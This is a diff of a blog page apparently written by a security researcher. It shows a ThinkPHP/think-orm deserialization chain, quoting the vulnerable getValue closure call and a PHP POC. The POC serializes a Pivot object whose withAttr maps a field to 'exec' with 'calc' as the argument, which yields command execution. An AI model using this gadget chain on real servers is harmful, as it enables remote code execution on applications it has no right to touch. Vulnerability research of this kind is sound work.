-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// vendor/topthink/think-orm/src/model/concern/Attribute.php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getValue</span><span class="params">(string $name, $value, $relation = false)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 检测属性获取器</span></span><br><span class="line">    $fieldName = <span class="keyword">$this</span>-&gt;getRealFieldName($name);</span><br><span class="line">    $method    = <span class="string">'get'</span> . Str::studly($name) . <span class="string">'Attr'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;withAttr[$fieldName])) &#123;</span><br><span class="line">        <span class="keyword">if</span> ($relation) &#123;</span><br><span class="line">            $value = <span class="keyword">$this</span>-&gt;getRelationValue($relation);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (in_array($fieldName, <span class="keyword">$this</span>-&gt;json) &amp;&amp; is_array(<span class="keyword">$this</span>-&gt;withAttr[$fieldName])) &#123;</span><br><span class="line">            $value = <span class="keyword">$this</span>-&gt;getJsonValue($fieldName, $value);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $closure = <span class="keyword">$this</span>-&gt;withAttr[$fieldName]; <span class="comment">// 14</span></span><br><span class="line">            $value   = $closure($value, <span class="keyword">$this</span>-&gt;data); <span class="comment">// 15</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125; </span><br><span class="line">    </span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre><code class="php">// vendor/topthink/think-orm/src/model/concern/Attribute.php
 
-<h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>;</span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Model</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $lazySave = <span class="keyword">true</span>;</span><br><span class="line">    <span class="keyword">private</span> $exists = <span class="keyword">true</span>;</span><br><span class="line">    <span class="keyword">protected</span> $withEvent = <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">private</span> $force = <span class="keyword">true</span>;</span><br><span class="line">    <span class="keyword">protected</span> $connection = <span class="string">"mysql"</span>;</span><br><span class="line">    <span class="keyword">private</span> $withAttr = [<span class="string">"Tyaoo"</span>=&gt;<span class="string">"exec"</span>]; <span class="comment">// 系统命令</span></span><br><span class="line">    <span class="keyword">private</span> $data = [<span class="string">"Tyaoo"</span>=&gt;<span class="string">"calc"</span>]; <span class="comment">// 命令参数</span></span><br><span class="line">    <span class="keyword">protected</span> $name;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = <span class="keyword">$this</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize(<span class="keyword">new</span> Pivot()));</span><br></pre></td></tr></table></figure>
+protected function getValue(string $name, $value, $relation = false)
+{
+    // 检测属性获取器
+    $fieldName = $this-&gt;getRealFieldName($name);
+    $method    = &#39;get&#39; . Str::studly($name) . &#39;Attr&#39;;
 
+    if (isset($this-&gt;withAttr[$fieldName])) {
+        if ($relation) {
+            $value = $this-&gt;getRelationValue($relation);
+        }
+
+        if (in_array($fieldName, $this-&gt;json) &amp;&amp; is_array($this-&gt;withAttr[$fieldName])) {
+            $value = $this-&gt;getJsonValue($fieldName, $value);
+        } else {
+            $closure = $this-&gt;withAttr[$fieldName]; // 14
+            $value   = $closure($value, $this-&gt;data); // 15
+        }
+    } 
+
+    ...
+}</code></pre>
+<h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><pre><code class="php">&lt;?php
+namespace think;
+abstract class Model {
+    private $lazySave = true;
+    private $exists = true;
+    protected $withEvent = false;
+    private $force = true;
+    protected $connection = &quot;mysql&quot;;
+    private $withAttr = [&quot;Tyaoo&quot;=&gt;&quot;exec&quot;]; // 系统命令
+    private $data = [&quot;Tyaoo&quot;=&gt;&quot;calc&quot;]; // 命令参数
+    protected $name;
+}
+
+namespace think\model;
+use think\Model;
+class Pivot extends Model {
+    function __construct() {
+        $this-&gt;name = $this;
+    }
+}
+
+echo base64_encode(serialize(new Pivot()));</code></pre>
 <h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200727230224.png" alt="image-20200727230214642" style="zoom:67%;">
 
 
@@ -571,7 +801,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">29</span>
+                  <span class="site-state-item-count">30</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -584,7 +814,7 @@
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">10</span>
+                  <span class="site-state-item-count">11</span>
                   <span class="site-state-item-name">标签</span>
                 </a>
               </div>
@@ -675,6 +905,17 @@
   <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.4</div>
 -->
 
+
+
+
+
+<!-- Highlight.js -->
+<link rel="stylesheet" href="//cdn.bootcss.com/highlight.js/9.2.0/styles/github.min.css">
+<script src="//cdn.bootcss.com/highlight.js/9.2.0/highlight.min.js">
+</script>
+<script>
+    hljs.initHighlightingOnLoad();
+</script>
 
 
         
